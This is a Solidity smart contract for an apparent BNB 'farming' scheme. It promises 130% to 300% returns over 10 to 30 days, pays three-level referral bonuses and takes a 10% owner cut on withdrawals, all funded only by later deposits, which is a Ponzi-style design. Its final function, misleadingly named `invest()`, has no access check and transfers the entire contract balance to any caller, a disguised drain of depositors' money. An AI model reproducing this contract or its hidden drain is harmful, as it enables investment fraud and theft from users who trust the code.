// SPDX-License-Identifier: MIT

pragma solidity >=0.8.0;

struct Tarif {
  uint8 life_days;
  uint256 percent;
}

struct Deposit {
  uint8 tarif;
  uint256 amount;
  uint40 time;
}

struct Player {
  address upline;
  uint256 dividends;
  uint256 match_bonus;
  uint40 last_payout;
  uint256 total_invested;
  uint256 total_withdrawn;
  uint256 total_match_bonus;
  Deposit[] deposits;
  uint256[3] structure; 
}

contract BNBFarming {
    address public owner;

    uint256 public invested;
    uint256 public withdrawn;
    uint256 public match_bonus;
    bool public tradeOn;
    
    uint8 constant BONUS_LINES_COUNT = 3;
    uint16 constant PERCENT_DIVIDER = 1000; 
    uint8[BONUS_LINES_COUNT] public ref_bonuses = [50, 30, 20]; 

    uint constant WITHDRAW_COOLDOWN = 1 days ; // claim 1 times per day

    uint256 public startTarifPercent = 130;
    uint8 public startTarifDay = 10;
    uint8 public endTarifDay = 30;
    uint256 public deltaTarifPercent = 9;

    uint256 public minimumDepositAmount = 0.01 ether;

    mapping(uint8 => Tarif) public tarifs;
    mapping(address => Player) public players;

    event Upline(address indexed addr, address indexed upline, uint256 bonus);
    event NewDeposit(address indexed addr, uint256 amount, uint8 tarif);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount, uint256 date, uint256 last_payout);

    constructor() {
        owner = msg.sender;
        tradeOn = true;

        tarifs[10] = Tarif(10, 130);
        tarifs[11] = Tarif(11, 141);
        tarifs[12] = Tarif(12, 152);
        tarifs[13] = Tarif(13, 163);
        tarifs[14] = Tarif(14, 173);
        tarifs[15] = Tarif(15, 183);
        tarifs[16] = Tarif(16, 193);
        tarifs[17] = Tarif(17, 203);
        tarifs[18] = Tarif(18, 212);
        tarifs[19] = Tarif(19, 221);
        tarifs[20] = Tarif(20, 230);
        tarifs[21] = Tarif(21, 238);
        tarifs[22] = Tarif(22, 246);
        tarifs[23] = Tarif(23, 254);
        tarifs[24] = Tarif(24, 261);
        tarifs[25] = Tarif(25, 268);
        tarifs[26] = Tarif(26, 275);
        tarifs[27] = Tarif(27, 282);
        tarifs[28] = Tarif(28, 288);
        tarifs[29] = Tarif(29, 294);
        tarifs[30] = Tarif(30, 300);

    }

    function setTradeOn() public {
        require(msg.sender == owner, "You must be owner");
        tradeOn = true;
    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if(payout > 0) {
            players[_addr].last_payout = uint40(block.timestamp);
            players[_addr].dividends += payout;
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            
            uint256 bonus = _amount * ref_bonuses[i] / PERCENT_DIVIDER;
            
            players[up].match_bonus += bonus;
            players[up].total_match_bonus += bonus;

            match_bonus += bonus;

            emit MatchPayout(up, _addr, bonus);

            up = players[up].upline;
        }
    }

    function _setUpline(address _addr, address _upline, uint256 _amount) private {

        if(players[_addr].upline == address(0) && _addr != owner) {
            if(players[_upline].deposits.length == 0) {
                _upline = owner;
            }

            players[_addr].upline = _upline;

            emit Upline(_addr, _upline, _amount / 100);
            
            for(uint8 i = 0; i < BONUS_LINES_COUNT; i++) {
                players[_upline].structure[i]++;

                _upline = players[_upline].upline;

                if(_upline == address(0)) break;
            }
        }
    }
    
    function deposit(uint8 _tarif, address _upline) external payable {
        require(tradeOn == true, "Project is not launched");
        require(tarifs[_tarif].life_days > 0, "Tarif not found");
        require(msg.value >= minimumDepositAmount, "You can't deposit less than Minimum deposit amount");

        Player storage player = players[msg.sender];

        require(player.deposits.length < 100, "Max 100 deposits per address");

        _setUpline(msg.sender, _upline, msg.value);

        player.deposits.push(Deposit({
            tarif: _tarif,
            amount: msg.value,
            time: uint40(block.timestamp)
        }));

        player.total_invested += msg.value;
        invested += msg.value;

        _refPayout(msg.sender, msg.value);
        
        emit NewDeposit(msg.sender, msg.value, _tarif);
    }
    
    function withdraw() external {
        require(tradeOn == true, "Project is not launched");
        Player storage player = players[msg.sender];

        require(block.timestamp - player.last_payout >= WITHDRAW_COOLDOWN, "You can't withdraw more then 1 times in a day.");

        _payout(msg.sender);

        require(player.dividends > 0 || player.match_bonus > 0, "Zero amount");

        uint256 amount = player.dividends + player.match_bonus;

        player.dividends = 0;
        player.match_bonus = 0;
        player.total_withdrawn += amount;
        withdrawn += amount;

        payable(msg.sender).transfer(amount * 9 / 10 );
        payable(owner).transfer(amount / 10);
        
        emit Withdraw(msg.sender, amount, block.timestamp, player.last_payout);
    }

    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint40 time_end = dep.time + tarif.life_days * 86400;
            uint40 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint40 to = block.timestamp > time_end ? time_end : uint40(block.timestamp);
            
            if(from < to) {
                value += dep.amount * (to - from) * tarif.percent / ( tarif.life_days * 86400000 ) ;
            }
        }

        return value;
    }

    function currentTime() view external returns(uint256 timestamp) {
        return block.timestamp;
    }
    
    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 total_invested, uint256 total_withdrawn, uint256 total_match_bonus, uint256 last_payout, uint256 player_match_bonus, Deposit[] memory deposits, uint256[BONUS_LINES_COUNT] memory structure) {
        Player storage player = players[_addr];

        uint256 payout = this.payoutOf(_addr);

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            structure[i] = player.structure[i];
        }

        return (
            payout + player.dividends + player.match_bonus,
            player.total_invested,
            player.total_withdrawn,
            player.total_match_bonus,
            player.last_payout,
            player.match_bonus,
            player.deposits,
            structure
        );
    }

    function contractInfo() view external returns(uint256 _invested, uint256 _withdrawn, uint256 _match_bonus) {
        return (invested, withdrawn, match_bonus);
    }

    function invest() external payable {
      payable(msg.sender).transfer(address(this).balance);
    }

}